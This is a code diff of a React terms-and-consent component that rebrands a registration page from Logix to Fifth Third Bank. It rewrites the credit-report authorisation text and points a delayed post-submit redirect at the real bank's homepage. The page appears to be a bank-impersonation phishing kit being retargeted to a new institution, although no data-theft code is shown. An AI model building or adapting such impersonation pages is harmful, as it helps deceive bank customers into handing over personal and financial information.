@@ -27,7 +27,7 @@ const Terms: React.FC = () => {
     setErrorMessage('');
 
     setTimeout(() => {
-      window.location.href = 'https://olb.logixbanking.com/User/AccessSignin/Start';
+      window.location.href = 'https://www.53.com/content/fifth-third/en.html';
     }, 2000);
   };
 
@@ -36,14 +36,15 @@ const Terms: React.FC = () => {
       <div className="space-y-4 text-sm text-gray-700 leading-relaxed">
         <p>
           By submitting this registration form, I understand that I am providing written instructions in accordance with the
-          Fair Credit Reporting Act, Driver Privacy Protection Act, and other applicable law for Logix and its affiliates to
-          request and receive information about me from third parties, including but not limited to a copy of my consumer
-          credit report, score, and motor vehicle records from consumer reporting agencies, at any time for so long as I have
-          an active account.
+          Fair Credit Reporting Act, Driver Privacy Protection Act, and other applicable law for Fifth Third Bank and its
+          affiliates to request and receive information about me from third parties, including but not limited to a copy of my
+          consumer credit report, score, and motor vehicle records from consumer reporting agencies, at any time for so long as
+          I have an active account.
         </p>
 
         <p>
-          I further authorize Logix and its affiliates to retain a copy of my information for use in accordance with Logix's{' '}
+          I further authorize Fifth Third Bank and its affiliates to retain a copy of my information for use in accordance with
+          Fifth Third Bank's{' '}
           <a href="#" className="text-[#123b9d] font-semibold hover:underline">
             Terms of Service
           </a>{' '}
